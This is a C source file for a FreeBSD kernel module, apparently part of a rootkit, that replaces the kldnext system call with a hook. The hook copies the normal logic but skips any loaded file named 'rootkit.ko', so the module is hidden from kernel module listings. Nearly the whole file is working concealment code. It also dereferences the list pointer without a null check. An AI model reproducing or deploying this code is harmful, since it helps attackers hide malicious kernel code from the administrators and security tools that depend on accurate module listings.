#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/param.h>
#include <sys/linker.h>

#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/mutex.h>
#include <sys/lock.h>
#include <sys/sx.h>

#include "rootkit.h"

static linker_file_t linker_find_file_by_id(int _fileid);
static linker_file_t linker_find_file_by_id(int fileid) {
	linker_file_t lf;

	sx_assert(&kld_sx, SA_XLOCKED);
	TAILQ_FOREACH(lf, &linker_files, link)
		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
			break;
	return (lf);
}

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap)
{
	linker_file_t lf;
	int error = 0;

#ifdef MAC
	error = mac_kld_check_stat(td->td_ucred);
	if (error)
		return (error);
#endif

	sx_xlock(&kld_sx);
	if (uap->fileid == 0)
		lf = TAILQ_FIRST(&linker_files);
	else {
		lf = linker_find_file_by_id(uap->fileid);
		if (lf == NULL) {
			error = ENOENT;
			goto out;
		}
		lf = TAILQ_NEXT(lf, link);
	}

	/* Skip partially loaded files. */
	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
		lf = TAILQ_NEXT(lf, link);

	if(strcmp(lf->filename, "rootkit.ko") == 0) {
		lf = TAILQ_NEXT(lf, link);
	}

	if (lf)
		td->td_retval[0] = lf->id;
	else
		td->td_retval[0] = 0;
out:
	sx_xunlock(&kld_sx);
	return (error);
}
